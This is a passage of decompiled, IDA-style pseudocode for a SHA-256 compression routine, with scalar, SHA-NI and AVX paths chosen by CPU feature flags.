        v512 = (v509 & (v1823 ^ v1781) ^ v1823) + v1533 + v1887;
        v513 = v508;
        v514 = v508 ^ __ROR4__(v508, 9);
        v1575 = v508;
        v515 = v1613 ^ v508;
        v516 = v512 + v511 + 1747873779;
        v517 = __ROR4__(v513 ^ __ROR4__(v514, 11), 2) + v516 + (v1613 ^ v515 & v506);
        v518 = v1697 + v516;
        v1891 = (__ROR4__(v1883 ^ __ROR4__(v1883, 2), 17) ^ (v1883 >> 10))
              + v1860
              + v1890
              + (__ROR4__(v1898 ^ __ROR4__(v1898, 11), 7) ^ (v1898 >> 3));
        v519 = __ROR4__((v1697 + v516) ^ __ROR4__(v1697 + v516, 14), 5);
        v1698 = v518;
        v520 = __ROR4__(v518 ^ v519, 6);
        v521 = (v518 & (v1781 ^ v1739) ^ v1781) + v1823 + v1891;
        v522 = v517;
        v523 = v517 ^ __ROR4__(v517, 9);
        v1534 = v517;
        v524 = v1575 ^ v517;
        v525 = v521 + v520 + 1955562222;
        v526 = __ROR4__(v522 ^ __ROR4__(v523, 11), 2) + v525 + (v1575 ^ v524 & v515);
        v527 = v1656 + v525;
        v1899 = (__ROR4__(v1887 ^ __ROR4__(v1887, 2), 17) ^ (v1887 >> 10))
              + v1864
              + v1898
              + (__ROR4__(v1902 ^ __ROR4__(v1902, 11), 7) ^ (v1902 >> 3));
        v528 = __ROR4__((v1656 + v525) ^ __ROR4__(v1656 + v525, 14), 5);
        v1657 = v527;
        v529 = __ROR4__(v527 ^ v528, 6);
        v530 = (v527 & (v1739 ^ v1698) ^ v1739) + v1781 + v1899;
        v531 = v526;
        v532 = v526 ^ __ROR4__(v526, 9);
        v1824 = v526;
        v533 = v1534 ^ v526;
        v534 = v530 + v529 + 2024104815;
        v535 = __ROR4__(v531 ^ __ROR4__(v532, 11), 2) + v534 + (v1534 ^ v533 & v524);
        v536 = v1613 + v534;
        v1903 = (__ROR4__(v1891 ^ __ROR4__(v1891, 2), 17) ^ (v1891 >> 10))
              + v1868
              + v1902
              + (__ROR4__(v1906 ^ __ROR4__(v1906, 11), 7) ^ (v1906 >> 3));
        v537 = __ROR4__((v1613 + v534) ^ __ROR4__(v1613 + v534, 14), 5);
        v1614 = v536;
        v538 = __ROR4__(v536 ^ v537, 6);
        v539 = (v536 & (v1698 ^ v1657) ^ v1698) + v1739 + v1903;
        v540 = v535;
        v541 = v535 ^ __ROR4__(v535, 9);
        v1782 = v535;
        v542 = v1824 ^ v535;
        v543 = v539 + v538 - 2067236844;
        v544 = __ROR4__(v540 ^ __ROR4__(v541, 11), 2) + v543 + (v1824 ^ v542 & v533);
        v545 = v1575 + v543;
        v1907 = (__ROR4__(v1899 ^ __ROR4__(v1899, 2), 17) ^ (v1899 >> 10))
              + v1872
              + v1906
              + (__ROR4__(v1910 ^ __ROR4__(v1910, 11), 7) ^ (v1910 >> 3));
        v546 = __ROR4__((v1575 + v543) ^ __ROR4__(v1575 + v543, 14), 5);
        v1576 = v545;
        v547 = __ROR4__(v545 ^ v546, 6);
        v548 = (v545 & (v1657 ^ v1614) ^ v1657) + v1698 + v1907;
        v549 = v544;
        v550 = v544 ^ __ROR4__(v544, 9);
        v1740 = v544;
        v551 = v1782 ^ v544;
        v552 = v548 + v547 - 1933114872;
        v553 = __ROR4__(v549 ^ __ROR4__(v550, 11), 2) + v552 + (v1782 ^ v551 & v542);
        v554 = v1534 + v552;
        v1911 = (__ROR4__(v1903 ^ __ROR4__(v1903, 2), 17) ^ (v1903 >> 10))
              + v1879
              + v1910
              + (__ROR4__(v1918 ^ __ROR4__(v1918, 11), 7) ^ (v1918 >> 3));
        v555 = __ROR4__((v1534 + v552) ^ __ROR4__(v1534 + v552, 14), 5);
        v1535 = v554;
        v556 = __ROR4__(v554 ^ v555, 6);
        v557 = (v554 & (v1614 ^ v1576) ^ v1614) + v1657 + v1911;
        v558 = v553;
        v559 = v553 ^ __ROR4__(v553, 9);
        v1699 = v553;
        v560 = v1740 ^ v553;
        v561 = v557 + v556 - 1866530822;
        v562 = __ROR4__(v558 ^ __ROR4__(v559, 11), 2) + v561 + (v1740 ^ v560 & v551);
        v563 = v1824 + v561;
        v1919 = (__ROR4__(v1907 ^ __ROR4__(v1907, 2), 17) ^ (v1907 >> 10))
              + v1883
              + v1918
              + (__ROR4__(v1922 ^ __ROR4__(v1922, 11), 7) ^ (v1922 >> 3));
        v564 = __ROR4__((v1824 + v561) ^ __ROR4__(v1824 + v561, 14), 5);
        v1825 = v563;
        v565 = __ROR4__(v563 ^ v564, 6);
        v566 = (v563 & (v1576 ^ v1535) ^ v1576) + v1614 + v1919;
        v567 = v562;
        v568 = v562 ^ __ROR4__(v562, 9);
        v1658 = v562;
        v569 = v1699 ^ v562;
        v570 = v566 + v565 - 1538233109;
        v571 = __ROR4__(v567 ^ __ROR4__(v568, 11), 2) + v570 + (v1699 ^ v569 & v560);
        v572 = v1782 + v570;
        v573 = __ROR4__((v1782 + v570) ^ __ROR4__(v1782 + v570, 14), 5);
        v1783 = v572;
        v574 = __ROR4__(v572 ^ v573, 6);
        v575 = (v572 & (v1535 ^ v1825) ^ v1535)
             + v1576
             + (__ROR4__(v1911 ^ __ROR4__(v1911, 2), 17) ^ (v1911 >> 10))
             + v1887
             + v1922
             + (__ROR4__(v1926 ^ __ROR4__(v1926, 11), 7) ^ (v1926 >> 3));
        v576 = v571;
        v577 = v571 ^ __ROR4__(v571, 9);
        v1615 = v571;
        v578 = v1658 ^ v571;
        v579 = v575 + v574 - 1090935817;
        v580 = __ROR4__(v576 ^ __ROR4__(v577, 11), 2) + v579 + (v1658 ^ v578 & v569);
        v581 = v1740 + v579;
        v582 = __ROR4__((v1740 + v579) ^ __ROR4__(v1740 + v579, 14), 5);
        v1741 = v581;
        v583 = __ROR4__(v581 ^ v582, 6);
        v584 = (v581 & (v1825 ^ v1783) ^ v1825)
             + v1535
             + (__ROR4__(v1919 ^ __ROR4__(v1919, 2), 17) ^ (v1919 >> 10))
             + v1891
             + v1926
             + (__ROR4__(v1853 ^ __ROR4__(v1853, 11), 7) ^ (v1853 >> 3));
        v585 = v580;
        v586 = v580 ^ __ROR4__(v580, 9);
        v587 = v1615 ^ v580;
        v588 = v584 + v583 - 965641998;
        result = v1933->m128i_i32[0] + __ROR4__(v585 ^ __ROR4__(v586, 11), 2) + v588 + (v1615 ^ v587 & v578);
        v589 = v1933->m128i_i32[1] + (v1615 ^ v587);
        v590 = v1933->m128i_i32[2] + v1615;
        v591 = v1933->m128i_i32[3] + v1658;
        v1933->m128i_i32[0] = result;
        v1933->m128i_i32[1] = v589;
        v1933->m128i_i32[2] = v590;
        v1933->m128i_i32[3] = v591;
        v1561 = v589;
        v16 = v590 ^ v589;
        v1599 = v590;
        v1642 = v591;
        v17 = v1933[1].m128i_i32[0] + v1699 + v588;
        v592 = v1933[1].m128i_i32[1] + v1741;
        v593 = v1933[1].m128i_i32[2] + v1783;
        v594 = v1933[1].m128i_i32[3] + v1825;
        v1933[1].m128i_i32[0] = v17;
        v1933[1].m128i_i32[1] = v592;
        v1933[1].m128i_i32[2] = v593;
        v1933[1].m128i_i32[3] = v594;
        v1725 = v592;
        v1 = v1927;
        v1767 = v593;
        v1809 = v594;
      }
      while ( (unsigned int)v1927 < v1931 );
      return result;
    }
    goto LABEL_7;
  }
  if ( (*(&dword_73C6D0 + 2) & 0x20000000) != 0 )
  {
    v595 = _mm_loadu_si128(v1933);
    si128 = _mm_load_si128((const __m128i *)&SHA512_Constants_46C840[64]);
    v597 = _mm_shuffle_epi32(v595, 27);
    v598 = _mm_shuffle_epi32(_mm_loadu_si128(v1933 + 1), 27);
    _XMM1 = _mm_alignr_epi8(_mm_shuffle_epi32(v595, 177), v598, 8);
    _XMM2 = _mm_unpacklo_epi64(v598, v597);
    do
    {
      _XMM3 = _mm_shuffle_epi8(_mm_loadu_si128(v1), si128);
      v602 = _mm_loadu_si128(v1 + 3);
      v1912 = _XMM2;
      _XMM4 = _mm_shuffle_epi8(_mm_loadu_si128(v1 + 1), si128);
      __asm { sha256rnds2 xmm2, xmm1, xmm0 }
      v1892 = _XMM1;
      __asm { sha256rnds2 xmm1, xmm2, xmm0 }
      _XMM5 = _mm_shuffle_epi8(_mm_loadu_si128(v1 + 2), si128);
      __asm { sha256rnds2 xmm2, xmm1, xmm0 }
      v1 += 4;
      __asm
      {
        sha256msg1 xmm3, xmm4
        sha256rnds2 xmm1, xmm2, xmm0
      }
      _XMM6 = _mm_shuffle_epi8(v602, si128);
      __asm { sha256rnds2 xmm2, xmm1, xmm0 }
      _XMM3 = _mm_add_epi32(_XMM3, _mm_alignr_epi8(_XMM6, _XMM5, 4));
      __asm
      {
        sha256msg1 xmm4, xmm5
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm3, xmm6
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM4 = _mm_add_epi32(_XMM4, _mm_alignr_epi8(_XMM3, _XMM6, 4));
      __asm
      {
        sha256msg1 xmm5, xmm6
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm4, xmm3
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM5 = _mm_add_epi32(_XMM5, _mm_alignr_epi8(_XMM4, _XMM3, 4));
      __asm
      {
        sha256msg1 xmm6, xmm3
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM6 = _mm_add_epi32(_XMM6, _mm_alignr_epi8(_XMM5, _XMM4, 4));
      __asm
      {
        sha256msg1 xmm3, xmm4
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm6, xmm5
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM3 = _mm_add_epi32(_XMM3, _mm_alignr_epi8(_XMM6, _XMM5, 4));
      __asm
      {
        sha256msg1 xmm4, xmm5
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm3, xmm6
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM4 = _mm_add_epi32(_XMM4, _mm_alignr_epi8(_XMM3, _XMM6, 4));
      __asm
      {
        sha256msg1 xmm5, xmm6
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm4, xmm3
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM5 = _mm_add_epi32(_XMM5, _mm_alignr_epi8(_XMM4, _XMM3, 4));
      __asm
      {
        sha256msg1 xmm6, xmm3
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM6 = _mm_add_epi32(_XMM6, _mm_alignr_epi8(_XMM5, _XMM4, 4));
      __asm
      {
        sha256msg1 xmm3, xmm4
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm6, xmm5
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM3 = _mm_add_epi32(_XMM3, _mm_alignr_epi8(_XMM6, _XMM5, 4));
      __asm
      {
        sha256msg1 xmm4, xmm5
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm3, xmm6
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM4 = _mm_add_epi32(_XMM4, _mm_alignr_epi8(_XMM3, _XMM6, 4));
      __asm
      {
        sha256msg1 xmm5, xmm6
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm4, xmm3
        sha256rnds2 xmm2, xmm1, xmm0
      }
      _XMM5 = _mm_add_epi32(_XMM5, _mm_alignr_epi8(_XMM4, _XMM3, 4));
      __asm
      {
        sha256msg1 xmm6, xmm3
        sha256rnds2 xmm1, xmm2, xmm0
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm2, xmm1, xmm0
        sha256rnds2 xmm1, xmm2, xmm0
      }
      _XMM6 = _mm_add_epi32(_XMM6, _mm_alignr_epi8(_XMM5, _XMM4, 4));
      __asm
      {
        sha256rnds2 xmm2, xmm1, xmm0
        sha256msg2 xmm6, xmm5
      }
      si128 = _mm_load_si128((const __m128i *)&SHA512_Constants_46C840[64]);
      __asm
      {
        sha256rnds2 xmm1, xmm2, xmm0
        sha256rnds2 xmm2, xmm1, xmm0
        sha256rnds2 xmm1, xmm2, xmm0
      }
      _XMM2 = _mm_add_epi32(_XMM2, v1912);
      _XMM1 = _mm_add_epi32(_XMM1, v1892);
    }
    while ( (const __m128i *)result != v1 );
    v674 = _mm_shuffle_epi32(_XMM2, 177);
    *v1933 = _mm_unpackhi_epi64(_mm_shuffle_epi32(_XMM1, 177), v674);
    v1933[1] = _mm_alignr_epi8(v674, _mm_shuffle_epi32(_XMM1, 27), 8);
    return result;
  }
  if ( (*(&dword_73C6D0 + 1) & 0x10000000 | dword_73C6D0 & 0x40000000) == 1342177280 )
  {
    if ( (*(&dword_73C6D0 + 2) & 0x108) == 264 )
    {
      __asm { vzeroall }
      result = v1933->m128i_i32[0];
      v1591 = v1933->m128i_i32[1];
      v1324 = v1933->m128i_i32[2] ^ v1591;
      v1632 = v1933->m128i_i32[2];
      v1675 = v1933->m128i_i32[3];
      v1325 = v1933[1].m128i_i32[0];
      v1758 = v1933[1].m128i_i32[1];
      _EDI = v1934;
      v1800 = v1933[1].m128i_i32[2];
      v1842 = v1933[1].m128i_i32[3];
      __asm { vmovdqa xmm7, xmmword ptr [ebp+100h] }
      do
      {
        __asm
        {
          vmovdqu xmm0, xmmword ptr [edi]
          vmovdqu xmm1, xmmword ptr [edi+10h]
          vmovdqu xmm2, xmmword ptr [edi+20h]
          vmovdqu xmm3, xmmword ptr [edi+30h]
          vpshufb xmm0, xmm0, xmm7
        }
        v1930 = (unsigned int)&_EDI[4];
        __asm
        {
          vpshufb xmm1, xmm1, xmm7
          vpshufb xmm2, xmm2, xmm7
          vpaddd  xmm4, xmm0, xmmword ptr [ebp+0]
          vpshufb xmm3, xmm3, xmm7
          vpaddd  xmm5, xmm1, xmmword ptr [ebp+10h]
          vpaddd  xmm6, xmm2, xmmword ptr [ebp+20h]
          vpaddd  xmm7, xmm3, xmmword ptr [ebp+30h]
          vmovdqa [esp+80h+var_60], xmm4
          vmovdqa [esp+80h+var_50], xmm5
          vmovdqa [esp+80h+var_40], xmm6
          vmovdqa [esp+80h+var_30], xmm7
        }
        do
        {
          _EBP += 4;
          __asm { vpalignr xmm4, xmm1, xmm0, 4 }
          v1716 = v1325;
          __asm
          {
            vpalignr xmm7, xmm3, xmm2, 4
            vpsrld  xmm6, xmm4, 7
          }
          v1552 = result;
          __asm { vpaddd  xmm0, xmm0, xmm7 }
          v1344 = __ROR4__(result, 2);
          v1345 = __ROR4__(result, 13);
          __asm { vpsrld  xmm7, xmm4, 3 }
          v1347 = __ROR4__(result, 22);
          __asm { vpslld  xmm5, xmm4, 0Eh }
          v1349 = v1591 ^ result;
          __asm { vpxor   xmm4, xmm7, xmm6 }
          v1351 = v1856
                + v1842
                + (v1800 & ~v1325 | v1758 & v1325)
                + (__ROR4__(v1325, 25) ^ __ROR4__(v1325, 11) ^ __ROR4__(v1325, 6));
          __asm
          {
            vpshufd xmm7, xmm3, 0FAh
            vpsrld  xmm6, xmm6, 0Bh
            vpxor   xmm4, xmm4, xmm5
          }
          v1676 = v1675 + v1351;
          __asm
          {
            vpslld  xmm5, xmm5, 0Bh
            vpxor   xmm4, xmm4, xmm6
          }
          v1843 = (v1591 ^ v1349 & v1324) + v1351 + (v1344 ^ v1345 ^ v1347);
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpxor   xmm4, xmm4, xmm5
            vpsrlq  xmm5, xmm7, 11h
          }
          v1360 = DWORD1(v1856)
                + v1800
                + (v1758 & ~v1676 | v1716 & v1676)
                + (__ROR4__(v1676, 25) ^ __ROR4__(v1676, 11) ^ __ROR4__(v1676, 6));
          __asm
          {
            vpaddd  xmm0, xmm0, xmm4
            vpxor   xmm6, xmm6, xmm5
            vpsrlq  xmm7, xmm7, 13h
          }
          v1633 = v1632 + v1360;
          __asm
          {
            vpxor   xmm6, xmm6, xmm7
            vpshufd xmm7, xmm6, 84h
          }
          v1801 = (v1552 ^ (v1552 ^ v1843) & v1349)
                + v1360
                + (__ROR4__(v1843, 2) ^ __ROR4__(v1843, 13) ^ __ROR4__(v1843, 22));
          __asm
          {
            vpsrldq xmm7, xmm7, 8
            vpaddd  xmm0, xmm0, xmm7
            vpshufd xmm7, xmm0, 50h ; 'P'
          }
          v1369 = DWORD2(v1856)
                + v1758
                + (v1716 & ~v1633 | v1676 & v1633)
                + (__ROR4__(v1633, 25) ^ __ROR4__(v1633, 11) ^ __ROR4__(v1633, 6));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpsrlq  xmm5, xmm7, 11h
            vpxor   xmm6, xmm6, xmm5
          }
          v1592 = v1591 + v1369;
          __asm
          {
            vpsrlq  xmm7, xmm7, 13h
            vpxor   xmm6, xmm6, xmm7
          }
          v1759 = (v1843 ^ (v1843 ^ v1801) & (v1552 ^ v1843))
                + v1369
                + (__ROR4__(v1801, 2) ^ __ROR4__(v1801, 13) ^ __ROR4__(v1801, 22));
          __asm
          {
            vpshufd xmm7, xmm6, 0E8h
            vpslldq xmm7, xmm7, 8
            vpaddd  xmm0, xmm0, xmm7
          }
          v1377 = HIDWORD(v1856)
                + v1716
                + (v1676 & ~v1592 | v1633 & v1592)
                + (__ROR4__(v1592, 25) ^ __ROR4__(v1592, 11) ^ __ROR4__(v1592, 6));
          __asm
          {
            vpaddd  xmm6, xmm0, xmmword ptr [ebp+0]
            vmovdqa [esp+80h+var_60], xmm6
            vpalignr xmm4, xmm2, xmm1, 4
          }
          v1553 = v1552 + v1377;
          __asm
          {
            vpalignr xmm7, xmm0, xmm3, 4
            vpsrld  xmm6, xmm4, 7
          }
          v1717 = (v1801 ^ (v1801 ^ v1759) & (v1843 ^ v1801))
                + v1377
                + (__ROR4__(v1759, 2) ^ __ROR4__(v1759, 13) ^ __ROR4__(v1759, 22));
          __asm
          {
            vpaddd  xmm1, xmm1, xmm7
            vpsrld  xmm7, xmm4, 3
            vpslld  xmm5, xmm4, 0Eh
            vpxor   xmm4, xmm7, xmm6
          }
          v1386 = v1875
                + v1676
                + (v1633 & ~v1553 | v1592 & v1553)
                + (__ROR4__(v1553, 25) ^ __ROR4__(v1553, 11) ^ __ROR4__(v1553, 6));
          __asm
          {
            vpshufd xmm7, xmm0, 0FAh
            vpsrld  xmm6, xmm6, 0Bh
            vpxor   xmm4, xmm4, xmm5
          }
          v1844 = v1843 + v1386;
          __asm
          {
            vpslld  xmm5, xmm5, 0Bh
            vpxor   xmm4, xmm4, xmm6
          }
          v1677 = (v1759 ^ (v1759 ^ v1717) & (v1801 ^ v1759))
                + v1386
                + (__ROR4__(v1717, 2) ^ __ROR4__(v1717, 13) ^ __ROR4__(v1717, 22));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpxor   xmm4, xmm4, xmm5
            vpsrlq  xmm5, xmm7, 11h
          }
          v1395 = DWORD1(v1875)
                + v1633
                + (v1592 & ~v1844 | v1553 & v1844)
                + (__ROR4__(v1844, 25) ^ __ROR4__(v1844, 11) ^ __ROR4__(v1844, 6));
          __asm
          {
            vpaddd  xmm1, xmm1, xmm4
            vpxor   xmm6, xmm6, xmm5
            vpsrlq  xmm7, xmm7, 13h
          }
          v1802 = v1801 + v1395;
          __asm
          {
            vpxor   xmm6, xmm6, xmm7
            vpshufd xmm7, xmm6, 84h
          }
          v1634 = (v1717 ^ (v1717 ^ v1677) & (v1759 ^ v1717))
                + v1395
                + (__ROR4__(v1677, 2) ^ __ROR4__(v1677, 13) ^ __ROR4__(v1677, 22));
          __asm
          {
            vpsrldq xmm7, xmm7, 8
            vpaddd  xmm1, xmm1, xmm7
            vpshufd xmm7, xmm1, 50h ; 'P'
          }
          v1404 = DWORD2(v1875)
                + v1592
                + (v1553 & ~v1802 | v1844 & v1802)
                + (__ROR4__(v1802, 25) ^ __ROR4__(v1802, 11) ^ __ROR4__(v1802, 6));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpsrlq  xmm5, xmm7, 11h
            vpxor   xmm6, xmm6, xmm5
          }
          v1760 = v1759 + v1404;
          __asm
          {
            vpsrlq  xmm7, xmm7, 13h
            vpxor   xmm6, xmm6, xmm7
          }
          v1593 = (v1677 ^ (v1677 ^ v1634) & (v1717 ^ v1677))
                + v1404
                + (__ROR4__(v1634, 2) ^ __ROR4__(v1634, 13) ^ __ROR4__(v1634, 22));
          __asm
          {
            vpshufd xmm7, xmm6, 0E8h
            vpslldq xmm7, xmm7, 8
            vpaddd  xmm1, xmm1, xmm7
          }
          v1412 = HIDWORD(v1875)
                + v1553
                + (v1844 & ~v1760 | v1802 & v1760)
                + (__ROR4__(v1760, 25) ^ __ROR4__(v1760, 11) ^ __ROR4__(v1760, 6));
          __asm
          {
            vpaddd  xmm6, xmm1, xmmword ptr [ebp+10h]
            vmovdqa [esp+80h+var_50], xmm6
            vpalignr xmm4, xmm3, xmm2, 4
          }
          v1718 = v1717 + v1412;
          __asm
          {
            vpalignr xmm7, xmm1, xmm0, 4
            vpsrld  xmm6, xmm4, 7
          }
          v1554 = (v1634 ^ (v1634 ^ v1593) & (v1677 ^ v1634))
                + v1412
                + (__ROR4__(v1593, 2) ^ __ROR4__(v1593, 13) ^ __ROR4__(v1593, 22));
          __asm
          {
            vpaddd  xmm2, xmm2, xmm7
            vpsrld  xmm7, xmm4, 3
            vpslld  xmm5, xmm4, 0Eh
            vpxor   xmm4, xmm7, xmm6
          }
          v1421 = v1895
                + v1844
                + (v1802 & ~v1718 | v1760 & v1718)
                + (__ROR4__(v1718, 25) ^ __ROR4__(v1718, 11) ^ __ROR4__(v1718, 6));
          __asm
          {
            vpshufd xmm7, xmm1, 0FAh
            vpsrld  xmm6, xmm6, 0Bh
            vpxor   xmm4, xmm4, xmm5
          }
          v1678 = v1677 + v1421;
          __asm
          {
            vpslld  xmm5, xmm5, 0Bh
            vpxor   xmm4, xmm4, xmm6
          }
          v1845 = (v1593 ^ (v1593 ^ v1554) & (v1634 ^ v1593))
                + v1421
                + (__ROR4__(v1554, 2) ^ __ROR4__(v1554, 13) ^ __ROR4__(v1554, 22));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpxor   xmm4, xmm4, xmm5
            vpsrlq  xmm5, xmm7, 11h
          }
          v1430 = DWORD1(v1895)
                + v1802
                + (v1760 & ~v1678 | v1718 & v1678)
                + (__ROR4__(v1678, 25) ^ __ROR4__(v1678, 11) ^ __ROR4__(v1678, 6));
          __asm
          {
            vpaddd  xmm2, xmm2, xmm4
            vpxor   xmm6, xmm6, xmm5
            vpsrlq  xmm7, xmm7, 13h
          }
          v1635 = v1634 + v1430;
          __asm
          {
            vpxor   xmm6, xmm6, xmm7
            vpshufd xmm7, xmm6, 84h
          }
          v1803 = (v1554 ^ (v1554 ^ v1845) & (v1593 ^ v1554))
                + v1430
                + (__ROR4__(v1845, 2) ^ __ROR4__(v1845, 13) ^ __ROR4__(v1845, 22));
          __asm
          {
            vpsrldq xmm7, xmm7, 8
            vpaddd  xmm2, xmm2, xmm7
            vpshufd xmm7, xmm2, 50h ; 'P'
          }
          v1439 = DWORD2(v1895)
                + v1760
                + (v1718 & ~v1635 | v1678 & v1635)
                + (__ROR4__(v1635, 25) ^ __ROR4__(v1635, 11) ^ __ROR4__(v1635, 6));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpsrlq  xmm5, xmm7, 11h
            vpxor   xmm6, xmm6, xmm5
          }
          v1594 = v1593 + v1439;
          __asm
          {
            vpsrlq  xmm7, xmm7, 13h
            vpxor   xmm6, xmm6, xmm7
          }
          v1761 = (v1845 ^ (v1845 ^ v1803) & (v1554 ^ v1845))
                + v1439
                + (__ROR4__(v1803, 2) ^ __ROR4__(v1803, 13) ^ __ROR4__(v1803, 22));
          __asm
          {
            vpshufd xmm7, xmm6, 0E8h
            vpslldq xmm7, xmm7, 8
            vpaddd  xmm2, xmm2, xmm7
          }
          v1447 = HIDWORD(v1895)
                + v1718
                + (v1678 & ~v1594 | v1635 & v1594)
                + (__ROR4__(v1594, 25) ^ __ROR4__(v1594, 11) ^ __ROR4__(v1594, 6));
          __asm
          {
            vpaddd  xmm6, xmm2, xmmword ptr [ebp+20h]
            vmovdqa [esp+80h+var_40], xmm6
            vpalignr xmm4, xmm0, xmm3, 4
          }
          v1555 = v1554 + v1447;
          __asm
          {
            vpalignr xmm7, xmm2, xmm1, 4
            vpsrld  xmm6, xmm4, 7
          }
          v1719 = (v1803 ^ (v1803 ^ v1761) & (v1845 ^ v1803))
                + v1447
                + (__ROR4__(v1761, 2) ^ __ROR4__(v1761, 13) ^ __ROR4__(v1761, 22));
          __asm
          {
            vpaddd  xmm3, xmm3, xmm7
            vpsrld  xmm7, xmm4, 3
            vpslld  xmm5, xmm4, 0Eh
            vpxor   xmm4, xmm7, xmm6
          }
          v1456 = v1915
                + v1678
                + (v1635 & ~v1555 | v1594 & v1555)
                + (__ROR4__(v1555, 25) ^ __ROR4__(v1555, 11) ^ __ROR4__(v1555, 6));
          __asm
          {
            vpshufd xmm7, xmm2, 0FAh
            vpsrld  xmm6, xmm6, 0Bh
            vpxor   xmm4, xmm4, xmm5
          }
          v1842 = v1845 + v1456;
          __asm
          {
            vpslld  xmm5, xmm5, 0Bh
            vpxor   xmm4, xmm4, xmm6
          }
          v1675 = (v1761 ^ (v1761 ^ v1719) & (v1803 ^ v1761))
                + v1456
                + (__ROR4__(v1719, 2) ^ __ROR4__(v1719, 13) ^ __ROR4__(v1719, 22));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpxor   xmm4, xmm4, xmm5
            vpsrlq  xmm5, xmm7, 11h
          }
          v1465 = DWORD1(v1915)
                + v1635
                + (v1594 & ~v1842 | v1555 & v1842)
                + (__ROR4__(v1842, 25) ^ __ROR4__(v1842, 11) ^ __ROR4__(v1842, 6));
          __asm
          {
            vpaddd  xmm3, xmm3, xmm4
            vpxor   xmm6, xmm6, xmm5
            vpsrlq  xmm7, xmm7, 13h
          }
          v1800 = v1803 + v1465;
          __asm
          {
            vpxor   xmm6, xmm6, xmm7
            vpshufd xmm7, xmm6, 84h
          }
          v1632 = (v1719 ^ (v1719 ^ v1675) & (v1761 ^ v1719))
                + v1465
                + (__ROR4__(v1675, 2) ^ __ROR4__(v1675, 13) ^ __ROR4__(v1675, 22));
          __asm
          {
            vpsrldq xmm7, xmm7, 8
            vpaddd  xmm3, xmm3, xmm7
            vpshufd xmm7, xmm3, 50h ; 'P'
          }
          v1474 = DWORD2(v1915)
                + v1594
                + (v1555 & ~v1800 | v1842 & v1800)
                + (__ROR4__(v1800, 25) ^ __ROR4__(v1800, 11) ^ __ROR4__(v1800, 6));
          __asm
          {
            vpsrld  xmm6, xmm7, 0Ah
            vpsrlq  xmm5, xmm7, 11h
            vpxor   xmm6, xmm6, xmm5
          }
          v1758 = v1761 + v1474;
          __asm
          {
            vpsrlq  xmm7, xmm7, 13h
            vpxor   xmm6, xmm6, xmm7
          }
          v1591 = (v1675 ^ (v1675 ^ v1632) & (v1719 ^ v1675))
                + v1474
                + (__ROR4__(v1632, 2) ^ __ROR4__(v1632, 13) ^ __ROR4__(v1632, 22));
          __asm
          {
            vpshufd xmm7, xmm6, 0E8h
            vpslldq xmm7, xmm7, 8
          }
          v1324 = v1632 ^ v1591;
          __asm { vpaddd  xmm3, xmm3, xmm7 }
          v1482 = HIDWORD(v1915)
                + v1555
                + (v1842 & ~v1758 | v1800 & v1758)
                + (__ROR4__(v1758, 25) ^ __ROR4__(v1758, 11) ^ __ROR4__(v1758, 6));
          __asm { vpaddd  xmm6, xmm3, xmmword ptr [ebp+30h] }
          v1484 = v1482 + (__ROR4__(v1591, 2) ^ __ROR4__(v1591, 13) ^ __ROR4__(v1591, 22));
          v1325 = v1719 + v1482;
          result = (v1632 ^ (v1632 ^ v1591) & (v1675 ^ v1632)) + v1484;
          __asm { vmovdqa [esp+80h+var_30], xmm6 }
        }
        while ( _EBP[4].m128i_i32[0] != 66051 );
        v1720 = v1325;
        v1556 = (v1632 ^ (v1632 ^ v1591) & (v1675 ^ v1632)) + v1484;
        v1485 = __ROR4__(result, 2);
        v1486 = __ROR4__(result, 13);
        v1487 = __ROR4__(result, 22);
        v1488 = v1591 ^ result;
        v1489 = v1856
              + v1842
              + (v1800 & ~v1325 | v1758 & v1325)
              + (__ROR4__(v1325, 25) ^ __ROR4__(v1325, 11) ^ __ROR4__(v1325, 6));
        v1679 = v1675 + v1489;
        v1846 = (v1591 ^ v1488 & v1324) + v1489 + (v1485 ^ v1486 ^ v1487);
        v1490 = DWORD1(v1856)
              + v1800
              + (v1758 & ~v1679 | v1720 & v1679)
              + (__ROR4__(v1679, 25) ^ __ROR4__(v1679, 11) ^ __ROR4__(v1679, 6));
        v1636 = v1632 + v1490;
        v1804 = (v1556 ^ (v1556 ^ v1846) & v1488)
              + v1490
              + (__ROR4__(v1846, 2) ^ __ROR4__(v1846, 13) ^ __ROR4__(v1846, 22));
        v1491 = DWORD2(v1856)
              + v1758
              + (v1720 & ~v1636 | v1679 & v1636)
              + (__ROR4__(v1636, 25) ^ __ROR4__(v1636, 11) ^ __ROR4__(v1636, 6));
        v1595 = v1591 + v1491;
        v1762 = (v1846 ^ (v1846 ^ v1804) & (v1556 ^ v1846))
              + v1491
              + (__ROR4__(v1804, 2) ^ __ROR4__(v1804, 13) ^ __ROR4__(v1804, 22));
        v1492 = HIDWORD(v1856)
              + v1720
              + (v1679 & ~v1595 | v1636 & v1595)
              + (__ROR4__(v1595, 25) ^ __ROR4__(v1595, 11) ^ __ROR4__(v1595, 6));
